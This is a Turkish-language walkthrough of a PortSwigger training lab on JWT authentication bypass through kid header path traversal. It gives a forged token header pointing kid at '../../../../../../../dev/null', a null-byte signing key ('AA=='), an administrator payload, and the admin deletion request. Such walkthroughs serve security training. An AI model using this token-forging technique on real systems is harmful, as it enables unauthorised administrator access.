Laboratuvar: Kid başlığı yolu geçişi yoluyla JWT kimlik doğrulamasının atlatılması
url: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal,



Analiz:

    -- Kid başlığından faydalanarak admini ele geçirmeliyiz.
    Kid kısmında JKU tarzında çalışmalar yaparsanız bir sunucudan veri çekilir bazende kid içerisinde 
    dosya yolu + barkod bulunur bu sayede sistemi açan kişi önceden belirlenmiş anahtarlardan hangisinin kullanıldığını
    o kidden anlayabilir. 

    -- Burada zafiyetin nedeni hs256 kullanıldığında tek anahtar olmasıdır . Ben null keyi ile bir anahtar hazırlarsam ve
    kid olarakda karşı sistemde null değer içeren dev/null klasörüne yönlendirirsem bunu paket açılmamış olarak yorumlayacaktır

Saldırı:

    -- Burpde isteği yakalayın ve hs256 kullanıldığını görün .

    -- Sonra JWT editörden yeni simetrik anahtarı seçin ve Based4 dilinde null olan AA== keyi ile bir anahtar oluşturunü

    -- Şimdi paketinizi 

    header  kısmını ;
     {
    "kid": "../../../../../../../dev/null",
    "alg": "HS256"
    }   

    payload kısmını ;

    {
    "iss": "portswigger",
    "exp": 1772222906,
    "sub": "administrator"
    }                                            olarak ayarlayın.

    Bilgi:  Burda ../ kullandık çünkü istediğimiz dizine kadar geri tuşuna basmamız gerekiyordu.

    -- Şimdi oluşturduğumuz anahtarla bu paketi sign ile imzalayarak paketi /admin yoluna yollayın

    -- Daha sonra gerekli yolu takip edin ve Labı tamamlayın (/admin/delete?username=carlos)


